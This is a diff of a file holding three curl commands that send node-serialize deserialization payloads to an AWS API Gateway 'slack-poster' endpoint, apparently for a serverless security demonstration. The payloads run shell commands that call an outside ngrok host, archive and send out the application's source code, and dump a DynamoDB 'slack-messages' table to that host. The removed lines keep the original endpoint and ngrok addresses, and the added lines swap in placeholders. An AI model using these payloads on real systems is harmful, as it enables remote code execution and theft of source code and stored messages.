@@ -1,10 +1,10 @@
 1 (test):
-curl -X POST -H "Content-Type: application/json" https://6dw53vd8cg.execute-api.us-east-1.amazonaws.com/dev/slack-poster --data '{"text":"hello", "username":"function(){require(\"child_process\").exec(\"curl http://07cf3049.ngrok.io\",function(error,stdout,stderr){console.log(stdout)});}()"}'
+curl -X POST -H "Content-Type: application/json" https://____API____.execute-api._____REGION_____.amazonaws.com/dev/slack-poster --data '{"text":"hello", "username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl ____REMOVE_SERVER____\",function(error,stdout,stderr){console.log(stdout)});}()"}'
 
 
 2 (steal code):
-curl -X POST -H "Content-Type: application/json" https://6dw53vd8cg.execute-api.us-east-1.amazonaws.com/dev/slack-poster --data '{"text":"hello", "username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"tar -pcvzf /tmp/source.tar.gz ./; b=`base64 --wrap=0 /tmp/source.tar.gz`; curl -X POST http://07cf3049.ngrok.io/hack --data $b\",function(error,stdout,stderr){console.log(stdout)});}()"}'
+curl -X POST -H "Content-Type: application/json" https://____API____.execute-api._____REGION_____.amazonaws.com/dev/slack-poster --data '{"text":"hello", "username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"tar -pcvzf /tmp/source.tar.gz ./; b=`base64 --wrap=0 /tmp/source.tar.gz`; curl -X POST ____REMOVE_SERVER____ --data $b\",function(error,stdout,stderr){console.log(stdout)});}()"}'
 
 
 3 (leak dynamo)
-curl -X POST -H "Content-Type: application/json" https://6dw53vd8cg.execute-api.us-east-1.amazonaws.com/dev/slack-poster --data '{"text":"hola!", "username":"_$$ND_FUNC$$_function(){var a=require(\"aws-sdk\"),h=require(\"http\"),d=new a.DynamoDB.DocumentClient;d.scan({TableName:\"slack-messages\"},function(e,a){if(e);else{var t=Buffer.from(JSON.stringify(a)).toString(\"base64\");console.log(t);h.get(\"http://ee71afb5.ngrok.io/hack?data=\"+t,function(e){})}});}()"}'
+curl -X POST -H "Content-Type: application/json" https://____API____.execute-api.us-east-1.amazonaws.com/dev/slack-poster --data '{"text":"hola!", "username":"_$$ND_FUNC$$_function(){var a=require(\"aws-sdk\"),h=require(\"http\"),d=new a.DynamoDB.DocumentClient;d.scan({TableName:\"slack-messages\"},function(e,a){if(e);else{var t=Buffer.from(JSON.stringify(a)).toString(\"base64\");console.log(t);h.get(\"____REMOVE_SERVER____?data=\"+t,function(e){})}});}()"}'
